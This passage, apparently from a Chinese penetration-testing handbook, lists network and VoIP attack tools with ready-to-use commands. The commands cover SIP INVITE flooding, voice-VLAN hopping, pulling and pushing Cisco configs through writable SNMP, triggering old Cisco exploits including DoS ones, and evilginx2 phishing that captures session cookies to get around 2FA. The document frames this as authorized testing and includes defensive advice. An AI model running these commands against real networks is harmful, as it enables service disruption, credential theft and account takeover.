inviteflood eth0 5000 example.local 192.168.1.5 100

# 参数:<iface> <user> <domain> <target-ip> <num-packets>
inviteflood <iface> <user> <domain> <target-ip> <count>
```

**实战要点**:
- 默认目标端口 5060/UDP;小包数即可显著影响小型 PBX,从小量开始。
- 与 iaxflood(IAX 协议版)配对覆盖两种信令栈。

### voiphopper — VoIP VLAN 跳跃测试

**用途**:通过 CDP/LLDP/DHCP 等方式发现语音 VLAN 并像 IP 话机一样接入,验证数据口能否混入语音网段。
**安装**:`sudo apt install voiphopper`
**使用场景**:内网见到话机+交换机语音 VLAN 架构时,先做 VLAN 跳跃测试再进入 VoIP 攻击阶段。

```bash
# 官网示例:评估模式(嗅探 ARP 学习网段)
voiphopper -i eth0 -z

# 模拟 Cisco IP 电话经 CDP 加入语音 VLAN
voiphopper -i eth0 -c 1

# 辅助:-l 列出可用接口;-m 伪造 MAC 后退出;-d 删除已建 VLAN 子接口
voiphopper -l
```

**实战要点**:
- 成功后生成 `eth0.<vlan-id>` 子接口并获得语音段 IP,后续直接跑 svmap/sippts。
- 正确防御是交换机语音端口绑定/802.1X+MAB;若数据口也能学语音 VLAN 即为发现。

### cisco-torch — Cisco 设备快速扫描器

**用途**:多进程 fork 并发扫描,识别远程 Cisco 设备的 Telnet/SSH/Web/NTP/TFTP/SNMP 服务并支持对发现服务做字典攻击(SNMP community、TFTP 配置文件名爆破)。
**安装**:`sudo apt install cisco-torch`
**使用场景**:拿到大网段要快速定位 Cisco 设备并摸清管理面暴露时;速度是其相对 cisco-ocs 的核心优势。

```bash
# 官网示例:对目标跑全部扫描类型
cisco-torch -A <target-ip>

# 扫描目标列表文件
cisco-torch -F <targets-file>
```

**实战要点**:
- 使用 torch.conf 配置;指纹库缺失时会提示(如 Telnet fingerprint.db),属正常告警。
- 发现 `WWW-Authenticate: Basic realm="level_15_access"` 即 IOS Web 管理面暴露,可转 cge.pl 尝试利用。

### copy-router-config.pl / merge-router-config.pl — SNMP 拉取/回写 Cisco 配置

**用途**:利用可写 SNMP community,通过 TFTP 把 Cisco 路由器配置拉到攻击机(copy),或把修改后的配置推回设备(merge)。
**安装**:`sudo apt install copy-router-config`
**使用场景**:已拿到 rw community(经 onesixtyce/snmp 爆破等)后的配置窃取与配置注入;一次操作直接拿到全部设备密钥。

```bash
# 1. 攻击机起 TFTP 服务(建议根目录 /tmp)
atftpd --daemon /tmp

# 2. 把路由器配置拉到本机(官网示例参数顺序)
copy-router-config.pl <router-ip> <tftp-server-ip> <community>
# 例:copy-router-config.pl 192.168.1.1 192.168.1.15 private

# 3. 编辑配置后推回路由器
merge-router-config.pl <router-ip> <tftp-server-ip> <community>
```

**实战要点**:
- 必须 rw community,ro 会失败;配置中的 enable secret/type-7 密钥可离线破解(见密码领域文档思路)。
- 拉下来的文件落在 TFTP 根目录;结束后关闭 atftpd 避免留后门服务。
- 对生产设备 merge 等于直接改配置,优先仅取证(copy),回写需客户明确同意。

### cge.pl — Cisco Global Exploiter

**用途**:内置编号化漏洞列表的 Cisco 利用工具,按编号对目标触发对应老漏洞。
**安装**:`sudo apt install cisco-global-exploiter`
**使用场景**:cisco-torch 发现目标后按指纹匹配编号快速验证已知漏洞是否仍暴露。

```bash
# 官网示例:利用 [3] IOS HTTP Auth 漏洞
cge.pl 192.168.99.230 3

# 通用形式
cge.pl <target-ip> <vuln-number>
```

**实战要点**:
- 常用编号(官方 help):1=677/678 Telnet 缓冲区溢出、2=IOS Router DoS、3=IOS HTTP Auth、4=IOS HTTP 配置任意管理访问、5=Catalyst SSH 协议不匹配 DoS、6=675 Web 管理 DoS。
- 面向老 IOS(12.x 时代),新设备基本免疫;命中说明设备严重超期未维护。
- 编号 2/5/6 属破坏性 DoS,授权范围内谨慎选择。

### evilginx2 — 钓鱼型 MITM 框架(绕 2FA)

**用途**:自带 HTTP+DNS 服务器,以反向代理方式站在受害者和真实站点之间,同时捕获凭据与会话 Cookie,从而绕过短信/TOTP 双因素。
**安装**:`sudo apt install evilginx2`
**使用场景**:授权社会工程演练:需要证明"钓鱼+会话劫持可绕过双因素"时;相较手工 mitmproxy 反代,它内置 phishlets 拦截规则与会话管理。

```bash
sudo evilginx2 -p <phishlets-dir>

# 交互式命令:
config domain <domain>
config ip <attacker-ip>
phishlets enable <name>
phishlets hostname <name> <domain>
lures create <name>       # 生成钓鱼链接
sessions                  # 查看捕获的会话 Cookie
```

**实战要点**:
- 需要可控域名+证书(自动 ACME)与 80/443 入站;本地实验可用 hosts+自签。
- phishlets 是按目标站点写的配置,仓库自带常见站点模板;自定义目标需自己编写。
- 报告结论应落点"检测+防劫持(FIDO2、异常会话告警)"而非仅凭据泄露本身。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| 0trace.sh | 在已建立 TCP 连接内做 traceroute,绕过状态包过滤 | 0trace | `0trace.sh <iface> <target-ip> [port]` |
| above | 纯被动嗅探发现网络设备漏洞(发现协议/FHRP/STP/LLMNR 等,零噪音) | above | `sudo above -i eth0 -f <logfile>` |
| arping | 向 IP/MAC 发 ARP 或 ICMP ping 探活 | arping | `sudo arping -c 3 <ip>` |
| arpwatch | 监控网段 MAC/IP 变化并邮件告警(检测 ARP 欺骗) | arpwatch | `sudo arpwatch -i eth0` |
| cisco-ocs | 按 IP 段批量扫描 Cisco 设备可利用性 | cisco-ocs | `cisco-ocs <start-ip> <end-ip>` |
| darkstat | 后台流量统计,网页出报表 | darkstat | `sudo darkstat -i eth0` |
| enumiax | IAX 协议用户名枚举/爆破 | enumiax | `enumiax -d <wordlist> <target>` |
| ferret-sidejack | 从流量中提取 Cookie 等会话数据(喂给 hamster) | ferret-sidejack | `ferret-sidejack -i eth0` |
| fiked | 伪 IKE 守护进程,冒充 Cisco VPN 网关捕获 XAUTH 凭据 | fiked | `fiked -g <gateway-ip> -k <group-id>:<psk>`(可选 `-l <file>` 记录凭据) |
| firewalk | 探测网关 ACL 会放行哪些四层协议/端口 | firewalk | `firewalk -S<ports> -i eth0 -n -pTCP <gateway-ip> <target-ip>` |
| fluxion | WPA/WPA2 钓鱼(伪造 AP 骗取密码)社会工程审计 | fluxion | `sudo fluxion` |
| fping | 轮询式并行 ICMP ping,支持网段/文件目标 | fping | `fping -g <cidr>` |
| fragrouter | IDS 规避流量整形(分片等 8 种模式) | fragrouter | `fragrouter -i eth0 -F1` |
| hamster-sidejack | 用 ferret 偷来的 Cookie 劫持会话的本地代理(127.0.0.1:1234) | hamster-sidejack | `hamster` |
| hexinject | 十六进制级原始包注入/嗅探框架(含 prettypacket/hex2raw/packets.tcl) | hexinject | `hexinject -s -i eth0` |
| httrack | 网站离线镜像复制(钓鱼页/信息收集素材) | httrack | `httrack <url> -O <dir>` |
| iaxflood | IAX(Asterisk)协议 UDP 洪水 | iaxflood | `iaxflood <src-ip> <dst-ip> <count>` |
| intrace | 借既有 TCP 连接枚举 IP 跳点(防火墙绕过侦察) | intrace | `intrace -h <host> -p <port> -s <size>` |
| iputils-arping | arping 的 iputils 打包版本(同二进制) | arping | `sudo arping -c 3 <ip>` |
| macchanger | 查看/伪造网卡 MAC 地址 | macchanger | `sudo macchanger -r eth0`(随机)/ `-m <mac> eth0` |
| netdiscover | 基于 ARP 的主动/被动主机发现 | netdiscover | `sudo netdiscover -r <cidr>`(被动 `-p`) |
| netmask | 计算地址范围对应的最小网络掩码集 | netmask | `netmask <ip>/<bits>` |
| netsniff-ng | 零拷贝高性能抓包套件(丢包敏感场景) | netsniff-ng | `netsniff-ng --in eth0 --out <file>.pcap` |
| ohrwurm | RTP 模糊测试(配合 arpspoof 做话机 MITM) | ohrwurm | `ohrwurm -a <ipA> -b <ipB> -A <portA> -B <portB> -i eth0` |
| p0f | 被动操作系统指纹(零发包,基于 SYN 特征) | p0f | `p0f -i eth0 -p -o <logfile>` |
| protos-sip | SIP 实现健壮性测试套件(Java) | protos-sip | `protos-sip -touri <user>@<domain>` |
| rtpbreak | 检测/重组/分析 RTP 会话,输出可用 sox/wireshark 处理 | rtpbreak | `rtpbreak -i eth0 -g -m -d <outdir>` |
| rtpflood | 对 RTP 处理设备灌包压测 | rtpflood | `rtpflood <src> <dst> <sport> <dport> <count> <seq> <ts> <ssid>` |
| rtpinsertsound | 向指定 RTP 流插入预录音频 | rtpinsertsound | `rtpinsertsound /usr/share/rtpinsertsound/stapler.wav -v` |
| rtpmixsound | 实时混入预录音频到目标 RTP 流 | rtpmixsound | `rtpmixsound /usr/share/rtpmixsound/stapler.wav -v` |
| sara | MikroTik RouterOS 配置/CVE 审计 | sara | `sudo sara audit <ip> <user> <profiles>`(密码运行时交互输入) |
| siege | HTTP 回归压测/基准(并发用户模拟) | siege | `siege -c 50 -t 1M <url>` |
| siparmyknife | SIP 模糊测试(XSS/SQLi/格式串/溢出探测) | siparmyknife | `siparmyknife -h`(交互配置) |
| sipsak | SIP 小工具(探测/跟踪/压力/伪造请求) | sipsak | `sipsak -vv -s sip:<user>@<host>` |
| sniffjoke | 透明扰乱自身 TCP 流,使被动窃听/IDS 难以还原 | sniffjoke | `sniffjoke -h`(配合 sj-iptcpopt-probe 预检) |
| ssldump | SSLv3/TLS 流量解析器(有密钥材料时可解密) | ssldump | `ssldump -i eth0`(离线 `-r <file>.pcap`) |
| sslsniff | 动态生成域证书的 SSL/TLS MITM 老工具(含 null-prefix/OCSP 攻击) | sslsniff | `sslsniff -a -s 8443 -c <cert.pem>` |
| tcpreplay | 以指定速率重放 pcap(测 NIDS/设备) | tcpreplay | `tcpreplay -i eth0 <file>.pcap` |
| termineter | 智能电表安全测试框架(C12.18/C12.19 光口) | termineter | `sudo termineter`(交互式,`show modules` 列模块) |

---

本文档所有技术内容仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景,严禁用于任何未授权环境。
